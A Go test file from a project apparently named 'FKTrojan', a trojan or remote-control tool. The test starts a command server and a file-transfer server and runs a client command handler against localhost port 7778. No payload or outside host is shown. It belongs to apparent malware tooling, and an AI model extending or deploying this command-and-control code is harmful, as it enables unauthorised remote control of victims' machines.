package service_command

import (
	"FKTrojan/command_handler_client"
	"FKTrojan/service_transfer"
	"io"
	"testing"
)

func TestServerHandler(t *testing.T) {
	// 开启command server
	go ListenAndServe()
	// 开启传输server
	go service_transfer.ListenAndServe()
	HandleCommand("127.0.0.1", 7778, func(r io.Reader, w io.Writer) error {
		return ClientHandler(r, w, command_handler_client.ClientDo)
	})
	//time.Sleep(time.Second)
}
